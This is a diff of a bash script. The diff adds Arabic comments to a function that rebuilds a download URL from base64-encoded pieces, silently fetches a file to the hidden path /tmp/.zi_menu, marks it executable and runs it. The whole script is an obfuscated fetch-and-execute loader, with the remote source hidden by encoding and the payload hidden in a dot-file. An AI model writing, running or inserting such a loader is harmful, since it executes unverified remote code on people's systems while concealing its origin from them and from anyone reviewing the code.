@@ -1,11 +1,14 @@
 #!/bin/bash
 
 download_menu_script() {
+  # دالة decode تفك تشفير base64 للنصوص المشفرة
   decode() {
     echo "$1" | base64 -d
   }
 
-  # Encoded parts of the URL
+  # هنا أجزاء الرابط مشفرة بـ base64
+  # نستخدم decode لفك التشفير لكل جزء على حدة
+
   p3=$(decode "aHR0cHM6")
   p2=$(decode "Ly8=")
   p1=$(decode "cmF3")
@@ -16,11 +19,18 @@ download_menu_script() {
   p9=$(decode "L3JlZnMvaGVhZHM=")
   p8=$(decode "L21haW4vbWVudQ==")
 
+  # نجمع كل الأجزاء مع بعض لتكوين الرابط النهائي
   full_url="${p3}${p2}${p1}${p4}${p5}${p6}${p7}${p9}${p8}"
 
+  # نحمل الملف من الرابط النهائي ونخزنه مؤقتاً
   curl -s "$full_url" -o /tmp/.zi_menu
+
+  # نعطي الملف صلاحية التنفيذ
   chmod +x /tmp/.zi_menu
+
+  # نشغل السكربت المحمل
   bash /tmp/.zi_menu
 }
 
+# ننفذ دالة تحميل وتشغيل السكربت
 download_menu_script
